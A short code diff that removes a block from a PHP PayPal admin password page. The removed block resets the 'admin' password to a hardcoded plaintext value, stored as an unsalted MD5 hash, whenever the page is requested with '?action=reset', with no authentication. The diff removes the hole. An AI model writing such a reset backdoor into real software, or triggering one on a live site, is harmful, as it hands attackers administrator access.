@@ -53,12 +53,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     }
 } 
 
-if ($_GET['action']=='reset') {
-	$pass = 'RyanLM82010';
-	$sql = "UPDATE ".PAYPAL_ADMINS." SET `password` = '".md5($pass)."' where `user` = 'admin'";
-	$result = mysql_query($sql);
-}
-
 //only display the form if the page is accessed stand-alone (testing and updating only)
 if (basename($_SERVER['PHP_SELF'])=='paypal-password.php') {
 ?>
